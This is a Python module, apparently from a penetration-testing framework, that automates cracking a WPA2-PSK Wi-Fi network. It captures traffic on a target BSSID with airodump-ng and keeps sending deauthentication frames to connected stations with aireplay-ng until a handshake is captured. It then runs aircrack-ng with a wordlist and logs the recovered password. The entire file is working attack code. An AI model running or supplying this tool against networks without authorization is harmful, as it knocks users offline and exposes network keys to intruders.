# -*- coding: UTF-8 -*-
from generic import *


class Wpa2pskCrack(WifiAttackModule):
    """ Capture a WPA handshake on the given BSSID and crack it with
         aircrack-ng.
    
    Author:  Yannick Pasquazzo
    Version: 1.0
    """
    config = Config({
        Option(
            'DEAUTH_INTERVAL',
            "Target station deauthentication interval (seconds)",
            False,
        ): 5,
        Option(
            'DURATION',
            "Cracking maximum duration",
            True,
        ): 120,
        Option(
            'WORDLIST',
            "Wordlist for the password cracking",
            True,
        ): str(Path(__file__).absolute().parent.joinpath("wordlist.txt")),
    })
    path = "auxiliary/wifi"
    requirements = {'system': ["aircrack-ng", "aireplay-ng", "airodump-ng"]}
    
    def postamble(self):
        for p in self.__procs:
            p.wait()
        self.logger.debug("Removing temporary directory '{}'"
                          .format(self.temp_dir))
        self.temp_dir.rmtree()
        del self.temp_dir
    
    def preamble(self):
        self.temp_dir = self.files.tempdir()
        self.__procs = []
        super(Wpa2pskCrack, self).preamble()
    
    def run(self):
        self.logger.warning("Press Ctrl+C to interrupt")
        bssid = self.config.option('BSSID').value
        for essid, values in self.console.state['TARGETS'].items():
            if values[0] == bssid:
                channel = values[1]
                break
        deauth_int = self.config.option('DEAUTH_INTERVAL').value
        mon_if = self.console.state.get('MONITOR_IF')
        cmd = "sudo airodump-ng -c {} -w {} --bssid {} {}" \
              .format(channel, self.temp_dir.joinpath("capture"), bssid, mon_if)
        to = self.config.option('DURATION').value
        found = False
        t = 0
        # capture packets on the target BSSID and stop when the WPA handshake is
        #  captured
        for line in self.console._jobs.run_iter(cmd, timeout=to):
            self.logger.debug(line)
            _ = STATION_REGEX.search(line)
            # deauthenticate every DEAUTH_INTERVAL seconds if the MAC address of
            #  a station is found
            if _ is not None and time() - t > deauth_int:
                station = _.group("station")
                self.logger.warning("Deauth station: {}".format(station))
                c = "sudo aireplay-ng -0 5 -a {} -c {} {}" \
                    .format(bssid, station, mon_if)
                self.__procs.append(self.console._jobs.process(c))
                t = time()
            _ = WPA_HANDSHAKE_REGEX.search(line)
            if _ is not None:
                if bssid == _.group("bssid"):
                    self.logger.info("WPA handshake captured !")
                    found = True
                    break
        if not found:
            self.logger.error("WPA handshake could not be captured")
            return
        # FIXME: move temporary CAP with WPA handshake to workspace
        # collect the capture file with the WPA handshake and feed it to
        #  aircrack-ng
        cap = list(self.temp_dir.iterfiles(".cap"))[0]
        wlist = self.config.option('WORDLIST').value
        cmd = "sudo aircrack-ng -w {} --bssid {} {}".format(wlist, bssid, cap)
        out, err = self.console._jobs.run(cmd)
        for line in out.splitlines():
            if "KEY FOUND!" in line:
                password = line.split("[ ", 1)[1].split(" ]", 1)[0]
                self.logger.success("Password found: {}".format(password))
                return
        self.logger.failure("Password could not be found")
